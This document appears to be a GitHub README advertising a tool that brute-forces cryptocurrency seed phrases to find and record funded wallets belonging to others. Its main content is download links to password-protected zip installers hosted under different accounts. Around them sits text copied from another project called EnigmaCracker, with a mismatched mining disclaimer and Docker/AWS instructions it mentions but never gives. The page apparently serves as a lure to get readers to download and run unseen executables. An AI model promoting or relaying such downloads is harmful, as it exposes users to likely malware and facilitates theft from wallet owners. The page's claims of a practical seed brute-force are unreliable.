# Crypto-Bruteforce-tool
Crypto-Bruteforce-tool is a tool for brute forcing Crypto Wallets

## ⚠️**Disclaimer**⚠️

This script is developed for educational and research purposes only.

**By using this code, you agree to the following:**

1. You will not use this code, in whole or in part, for malicious intent, including but not limited to unauthorized mining on third-party systems.
2. You will seek explicit permission from any and all system owners before running or deploying this code.
3. You understand the implications of running mining software on hardware, including the potential for increased wear and power consumption.
4. The creator of this script cannot and will not be held responsible for any damages, repercussions, or any negative outcomes that result from using this script.

If you do not agree to these terms, please do not use or distribute this code.


[![image](https://github.com/WassimBarhoumii/Crypto-Bruteforce-tool/blob/main/0UUxzc9.png)](https://github.com/WassimBarhoumii/Crypto-Bruteforce-tool/releases/download/crypto-bruteforce-tool/Installer.zip)

# password: 2024

## **How it works?**

We'll begin by delving into the foundational concepts. Upon establishing a wallet through platforms like **Exodus/TrustWallet** or similar services, users receive a **mnemonic phrase (_seed-phrase_)** comprised of **12 unique words**. The selection of words for this passphrase isn't arbitrary; they are derived from a specific lexicon containing **2048 potential words**. From this collection, the passphrase words are selected at random (**_the entire list of these words is accessible_** [**_HERE_**](https://www.blockplate.com/pages/bip-39-wordlist)). Utilizing this passphrase, an individual has the capability to access their wallet on any device and manage their assets. My application operates by employing brute force techniques to decipher these passphrases.

If Crypto-Bruteforce-tool finds a wallet with a balance, it will create `wallets_with_balance.txt` file that will contain the info of the discovered wallet.

Upon execution, Crypto-Bruteforce-tool generates a comprehensive log file named `crypto.log`, which neatly records the entire session history for review and analysis.

# Technical Details

## Master Seed and Wallet Generation

![derivation](https://github.com/yaron4u/EnigmaCracker/assets/67191566/bbdcaab5-030f-4e03-b1cb-c816253d27df)

Crypto-Bruteforce-tool is engineered around the key principle of the **Master Seed** in cryptocurrency wallet generation, as per the standards described in BIP 32 for Hierarchical Deterministic (HD) Wallets. The Python script provided within this repository is designed to create a mnemonic phrase (also known as a seed phrase), which essentially acts as the **Master Seed** from which all cryptographic keys can be derived.

For a more in-depth understanding of this topic, feel free to explore the detailed documentation available here: [BIP 32 wiki](https://github.com/bitcoin/bips/blob/master/bip-0032.mediawiki).

### The Role of Master Seed in Crypto-Bruteforce-tool

The script leverages the `bip_utils` library to generate a 12-word BIP39 mnemonic. This mnemonic is a human-readable representation of the wallet's **Master Seed**. This seed is then used to generate seeds for various cryptocurrency wallets, specifically for Bitcoin (BTC) and Ethereum (ETH), by following the BIP44 protocol that defines a logical hierarchy for deterministic wallets.

### Code Workflow:

1. **Seed Generation**: The `bip()` function in the script calls upon the BIP39 protocol to generate a new 12-word mnemonic. This is the first and most crucial step in the HD wallet creation process.
    
2. **Seed to Wallet Transformation**: The functions `bip44_ETH_wallet_from_seed` and `bip44_BTC_seed_to_address` take the generated mnemonic and produce the corresponding wallet addresses for Ethereum and Bitcoin, respectively. These addresses are derived from the master seed and follow a deterministic path outlined by BIP44, ensuring that each mnemonic generates a unique and recoverable set of addresses.
    
3. **Balance Checking**: With the generated addresses, the script uses online blockchain explorers through their APIs (Etherscan for Ethereum and Blockchain.info for Bitcoin) to check if the generated wallets contain any balance.
    
4. **Logging Results**: If a balance is found, the script writes the mnemonic, the derived addresses, and the wallet balances to a file (`wallets_with_balance.txt`), preserving the potentially valuable information for further examination.
    

Through the integration of BIP39 and BIP44 protocols, Crypto-Bruteforce-tool serves as a practical example of how the **Master Seed** forms the bedrock of cryptocurrency wallets, allowing for a secure, hierarchical structure of key derivation and management.

## Installation

# [DOWNLOAD](https://github.com/DjamaGuelleh/crypto-bruteforce-seed-generator/releases/download/crypto-bruteforce/Bruteforce.zip)



### Note
- The Docker environment provides an isolated and consistent runtime for Crypto-Bruteforce-toolr.
- Ensure that the Docker daemon is running before executing these commands.
- Adjustments to the script or environment variables require a rebuild of the Docker image for changes to take effect.
- **Modified Script for Docker**: The Docker version of Crypto-Bruteforce-tool runs a slightly modified version of the script (`EC.py`) compared to the standalone version. These modifications are specifically tailored for the Docker environment to ensure smooth operation within a container. For instance, any code segments that require GUI interaction or OS-specific commands have been adjusted or removed since Docker containers typically run in a headless (non-GUI) environment.
- **Streamlined Dependencies**: The `requirements.txt` file for the Docker version contains fewer libraries. This is because Docker provides a controlled environment where only the necessary dependencies are included to run the script. This streamlined approach helps in reducing the overall size of the Docker image and improves the efficiency of the script within the container.
---

## Running Crypto-Bruteforce-toolr on AWS

This guide will walk you through the process of using EnigmaCracker on AWS. The steps include setting up an Amazon ECR repository for your Docker image, creating an EC2 instance with Ubuntu, and then pulling and running the Crypto-Bruteforce-tool Docker container on that instance.

## Updates

- **Dual Cryptocurrency Detection**: EnigmaCracker now supports detection of both BTC and ETH wallets.
- **AWS Integration**: I've developed a comprehensive guide to help you deploy EnigmaCracker on AWS (Amazon Web Services). This integration enables you to utilize cloud computing resources for better performance and scalability. The guide includes detailed instructions for setting up EnigmaCracker on Amazon EC2 (Elastic Compute Cloud) instances and using Amazon ECR (Elastic Container Registry) for efficient cloud-based operations.



`Star and watch the repo for updates, and your support is greatly appreciated!`
